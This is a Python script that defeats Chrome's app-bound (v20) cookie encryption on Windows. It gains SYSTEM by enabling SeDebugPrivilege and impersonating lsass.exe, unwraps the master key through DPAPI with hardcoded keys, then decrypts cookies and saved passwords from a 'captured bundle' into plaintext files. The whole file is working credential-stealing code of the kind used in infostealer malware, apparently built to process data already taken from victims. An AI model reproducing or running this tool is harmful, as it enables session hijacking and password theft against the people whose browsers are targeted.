#!/usr/bin/env python3
"""v20_live_unlock.py -- recover the Chrome v20 (app-bound) master key on a
live box, then decrypt every captured v20 cookie/password.

needs: administrator (UAC). flow (all documented public techniques):
  1. SeDebugPrivilege -> impersonate lsass.exe (SYSTEM)
  2. SYSTEM CryptUnprotectData on Local State app_bound_encrypted_key (APPB)
  3. user CryptUnprotectData on the result
  4. parse [hdr_len][header][content_len][flag|enc_key|iv|ct|tag]
  5. flag 1: AESGCM(hardcoded)  flag 2: ChaCha20(hardcoded)
     flag 3: NCrypt "Google Chromekey1" + XOR  flag 4: "Google Chromekey2" + XOR
  6. AESGCM(iv, ct+tag) -> v20 master key
  7. write key + decrypt the captured bundle (cookies+passwords) -> plaintext

usage (elevated):  python v20_live_unlock.py --bundle <dir> [--psk-file psk.txt]
"""
import argparse
import base64
import ctypes
import ctypes.wintypes as wt
import io
import json
import os
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # noqa: E402

adv = ctypes.windll.advapi32
k32 = ctypes.windll.kernel32
ncrypt = ctypes.windll.NCRYPT
crypt32 = ctypes.windll.crypt32

FLAG1_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
FLAG2_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
FLAG3_XOR = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")
FLAG3_CNG = "Google Chromekey1"
FLAG4_XOR = bytes.fromhex("208A6DA7114A44E6B463114BD9DA397E939ADEFEDBF4588117926B0F2C503158")
FLAG4_CNG = "Google Chromekey2"


class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]


class LUID(ctypes.Structure):
    _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [("PrivilegeCount", wt.DWORD),
                ("Luid", LUID),
                ("Attributes", wt.DWORD)]


def _blob(d):
    b = ctypes.create_string_buffer(bytes(d), len(d))
    return DATA_BLOB(len(d), ctypes.cast(b, ctypes.POINTER(ctypes.c_char)))


def dpapi_unprotect(data):
    i = _blob(data)
    o = DATA_BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(i), None, None, None, None, 0,
                                      ctypes.byref(o)):
        raise OSError("CryptUnprotectData failed: %d" % k32.GetLastError())
    try:
        return ctypes.string_at(o.pbData, o.cbData)
    finally:
        k32.LocalFree(o.pbData)


def enable_privilege(name="SeDebugPrivilege"):
    h = wt.HANDLE()
    if not adv.OpenProcessToken(k32.GetCurrentProcess(), 0x20 | 0x8,  # ADJUST_PRIVILEGES|QUERY
                                 ctypes.byref(h)):
        raise OSError("OpenProcessToken(self) failed: %d (not elevated?)" %
                      k32.GetLastError())
    try:
        luid = LUID()
        if not adv.LookupPrivilegeValueW(None, name, ctypes.byref(luid)):
            raise OSError("LookupPrivilegeValue failed: %d" % k32.GetLastError())
        tp = TOKEN_PRIVILEGES(1, luid, 0x2)  # SE_PRIVILEGE_ENABLED
        k32.SetLastError(0)
        if not adv.AdjustTokenPrivileges(h, False, ctypes.byref(tp), 0, None, None):
            raise OSError("AdjustTokenPrivileges failed: %d" % k32.GetLastError())
        # AdjustTokenPrivileges returns TRUE with ERROR_NOT_ALL_ASSIGNED
        # when the token simply lacks the privilege -- surface that clearly
        if k32.GetLastError() == 1300:
            raise OSError("token lacks %s -- run elevated" % name)
    finally:
        k32.CloseHandle(h)


class ImpersonateLSASS:
    """set the calling thread's token to a duplicated lsass token (SYSTEM)"""

    def __enter__(self):
        enable_privilege()
        # find lsass pid via Toolhelp snapshot
        class PE32(ctypes.Structure):
            _fields_ = [("dwSize", wt.DWORD), ("cntUsage", wt.DWORD),
                        ("th32ProcessID", wt.DWORD), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                        ("th32ModuleID", wt.DWORD), ("cntThreads", wt.DWORD),
                        ("th32ParentProcessID", wt.DWORD), ("pcPriClassBase", wt.LONG),
                        ("dwFlags", wt.DWORD), ("szExeFile", ctypes.c_char * 260)]
        snap = k32.CreateToolhelp32Snapshot(0x2, 0)  # TH32CS_SNAPPROCESS
        pid = None
        e = PE32()
        e.dwSize = ctypes.sizeof(PE32)
        if k32.Process32First(snap, ctypes.byref(e)):
            while True:
                if e.szExeFile.lower() == b"lsass.exe":
                    pid = e.th32ProcessID
                    break
                if not k32.Process32Next(snap, ctypes.byref(e)):
                    break
        k32.CloseHandle(snap)
        if pid is None:
            raise OSError("lsass.exe not found")
        hproc = k32.OpenProcess(0x0400, False, pid)  # PROCESS_QUERY_INFORMATION
        htok = wt.HANDLE()
        if not adv.OpenProcessToken(hproc, 0x0002 | 0x0001 | 0x0008,  # DUP|QUERY|IMPERSONATE
                                    ctypes.byref(htok)):
            raise OSError("OpenProcessToken(lsass) failed: %d" % k32.GetLastError())
        self.dup = wt.HANDLE()
        # SecurityImpersonation = 2, TokenImpersonation = 2 (SetThreadToken
        # requires an impersonation token, not a primary one)
        if not adv.DuplicateTokenEx(htok, 0x0002 | 0x0001 | 0x0008, None, 2, 2,
                                    ctypes.byref(self.dup)):
            raise OSError("DuplicateTokenEx failed: %d" % k32.GetLastError())
        # TokenImpersonation type: DuplicateTokenEx with TokenType=TokenImpersonation(2)
        if not adv.SetThreadToken(None, self.dup):
            raise OSError("SetThreadToken failed: %d" % k32.GetLastError())
        k32.CloseHandle(htok)
        k32.CloseHandle(hproc)
        return self

    def __exit__(self, *a):
        adv.RevertToSelf()
        k32.CloseHandle(self.dup)


def ncrypt_decrypt(data, key_name):
    hprov = wt.HANDLE()
    st = ncrypt.NCryptOpenStorageProvider(
        ctypes.byref(hprov), "Microsoft Software Key Storage Provider", 0)
    if st:
        raise OSError("NCryptOpenStorageProvider: 0x%x" % (st & 0xffffffff))
    hkey = wt.HANDLE()
    st = ncrypt.NCryptOpenKey(hprov, ctypes.byref(hkey), key_name, 0, 0)
    if st:
        ncrypt.NCryptFreeObject(hprov)
        raise OSError("NCryptOpenKey(%s): 0x%x" % (key_name, st & 0xffffffff))
    buf_in = ctypes.create_string_buffer(bytes(data), len(data))
    need = wt.DWORD(0)
    st = ncrypt.NCryptDecrypt(hkey, buf_in, len(data), None, None, 0,
                              ctypes.byref(need), 0x40)
    if st:
        raise OSError("NCryptDecrypt(size): 0x%x" % (st & 0xffffffff))
    out = ctypes.create_string_buffer(need.value)
    got = wt.DWORD(0)
    st = ncrypt.NCryptDecrypt(hkey, buf_in, len(data), None, out, need.value,
                              ctypes.byref(got), 0x40)
    if st:
        raise OSError("NCryptDecrypt: 0x%x" % (st & 0xffffffff))
    ncrypt.NCryptFreeObject(hkey)
    ncrypt.NCryptFreeObject(hprov)
    return out.raw[:got.value]


def parse_key_blob(b):
    r = io.BytesIO(b)
    parsed = {}
    hlen = struct.unpack("<I", r.read(4))[0]
    parsed["header"] = r.read(hlen)
    clen = struct.unpack("<I", r.read(4))[0]
    assert hlen + clen + 8 == len(b), "key blob length mismatch"
    parsed["flag"] = r.read(1)[0]
    if parsed["flag"] in (1, 2):
        parsed["iv"] = r.read(12)
        parsed["ct"] = r.read(32)
        parsed["tag"] = r.read(16)
    elif parsed["flag"] in (3, 4):
        parsed["enc_key"] = r.read(32)
        parsed["iv"] = r.read(12)
        parsed["ct"] = r.read(32)
        parsed["tag"] = r.read(16)
    else:
        raise ValueError("unsupported flag %d" % parsed["flag"])
    return parsed


def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))


def derive_v20_key(parsed):
    f = parsed["flag"]
    if f == 1:
        return AESGCM(FLAG1_KEY).decrypt(parsed["iv"], parsed["ct"] + parsed["tag"], None)
    if f == 2:
        from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
        return ChaCha20Poly1305(FLAG2_KEY).decrypt(parsed["iv"], parsed["ct"] + parsed["tag"], None)
    if f == 3:
        with ImpersonateLSASS():
            dec = ncrypt_decrypt(parsed["enc_key"], FLAG3_CNG)
        return AESGCM(xor(dec, FLAG3_XOR)).decrypt(parsed["iv"], parsed["ct"] + parsed["tag"], None)
    if f == 4:
        with ImpersonateLSASS():
            dec = ncrypt_decrypt(parsed["enc_key"], FLAG4_CNG)
        return AESGCM(xor(dec, FLAG4_XOR)).decrypt(parsed["iv"], parsed["ct"] + parsed["tag"], None)
    raise ValueError("flag")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--bundle", default=None, help="captured bundle dir to decrypt after key recovery")
    ap.add_argument("--psk-file", default=os.path.join(HERE, "psk.txt"))
    ap.add_argument("--local-state", default=None)
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    if not args.local_state:
        p = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        args.local_state = p
    ls = json.load(open(args.local_state, encoding="utf-8"))
    raw = base64.b64decode(ls["os_crypt"]["app_bound_encrypted_key"])
    assert raw[:4] == b"APPB", "no APPB prefix"
    blob = raw[4:]

    with ImpersonateLSASS():
        outer = dpapi_unprotect(blob)          # SYSTEM layer
    print("[+] outer (SYSTEM DPAPI) layer: %d bytes" % len(outer))
    inner = dpapi_unprotect(outer)             # user layer (live session)
    print("[+] inner (user DPAPI) layer: %d bytes" % len(inner))
    parsed = parse_key_blob(inner)
    print("[+] flag byte: %d | header: %s" % (parsed["flag"], parsed["header"][:40]))
    v20_key = derive_v20_key(parsed)
    print("[+] V20 MASTER KEY: %s" % v20_key.hex())

    outdir = args.out or os.path.join(os.path.dirname(args.local_state), "..", "..")
    outdir = os.path.normpath(outdir)

    if not args.bundle:
        print("[i] no --bundle given; key recovery complete")
        return 0

    import shcrypto
    import sqlite3
    psk = open(args.psk_file).read().strip().encode()
    bd = args.bundle if os.path.isdir(args.bundle) else os.path.dirname(args.bundle)
    manifest, parts = shcrypto.unpack(open(os.path.join(bd, "bundle.bin"), "rb").read(), psk)
    pd = dict(parts)
    unc = os.path.join(bd, "unlocked")
    os.makedirs(unc, exist_ok=True)
    open(os.path.join(unc, "v20_master_key.bin"), "wb").write(v20_key)

    cookies, passes = [], []
    for name, data in pd.items():
        is_c = name.endswith("/Cookies") or name.endswith("/Cookies2")
        is_p = "LoginData" in name
        if not (is_c or is_p):
            continue
        fd, tmp = tempfile.mkstemp(suffix=".db")
        os.close(fd)
        open(tmp, "wb").write(data)
        import re as _re
        con = sqlite3.connect(tmp)
        cols = [r[1] for r in con.execute("PRAGMA table_info(cookies)" if is_c
                                          else "PRAGMA table_info(logins)")]
        try:
            if is_c:
                for host, cn, ev, exp in con.execute(
                        "SELECT host_key,name,encrypted_value,expires_utc FROM cookies"):
                    if ev[:3] != b"v20":
                        continue
                    try:
                        body = ev[3:]
                        clear = AESGCM(v20_key).decrypt(body[:12], body[12:], None)
                        val = clear[32:].decode("utf-8", "replace")  # strip host-hash prefix
                        cookies.append(f"{host}\tTRUE\t/\tFALSE\t{exp}\t{cn}\t{val}")
                    except Exception:
                        pass
            else:
                for url, un, ev in con.execute(
                        "SELECT origin_url,username_value,encrypted_value FROM logins"):
                    if not ev or ev[:3] not in (b"v10", b"v20"):
                        continue
                    try:
                        body = ev[3:]
                        clear = AESGCM(v20_key).decrypt(body[:12], body[12:], None)
                        pw = clear[32:].decode("utf-8", "replace")
                        passes.append(f"{url}\t{un}\t{pw}")
                    except Exception:
                        pass
        except Exception as e:
            print("[!] %s: %s" % (name, e))
        finally:
            con.close()
            os.unlink(tmp)

    if cookies:
        open(os.path.join(unc, "cookies_all.txt"), "w", encoding="utf-8").write(
            "# Netscape HTTP Cookie File\n" + "\n".join(cookies) + "\n")
    if passes:
        open(os.path.join(unc, "passwords.txt"), "w", encoding="utf-8").write(
            "url\tusername\tpassword\n" + "\n".join(passes) + "\n")
    print("[+] DECRYPTED: %d cookies, %d saved passwords -> %s" %
          (len(cookies), len(passes), unc))
    return 0


if __name__ == "__main__":
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("run elevated (administrator)"); sys.exit(1)
    sys.exit(main())
